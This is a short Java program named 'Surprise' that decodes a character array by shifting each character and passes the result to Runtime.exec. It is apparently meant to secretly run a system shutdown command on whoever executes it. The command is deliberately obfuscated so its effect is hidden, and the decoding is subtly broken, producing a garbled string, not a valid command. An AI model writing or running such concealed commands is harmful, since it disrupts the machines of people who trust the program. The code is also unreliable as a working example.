import java.io.IOException;

public class Surprise {
    public static void main(String[] args) {
        try {
            char[] commandArray = { 't', 'i', 'v', 'v', 'e', 'p', 'o', ' ', '0', '/', 't', 'r', ' ', '0', '/', 'u' };
            for (int i = 0; i < commandArray.length; i++) {
                commandArray[i] -= 1;
            }
            String command = new String(commandArray);
            
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
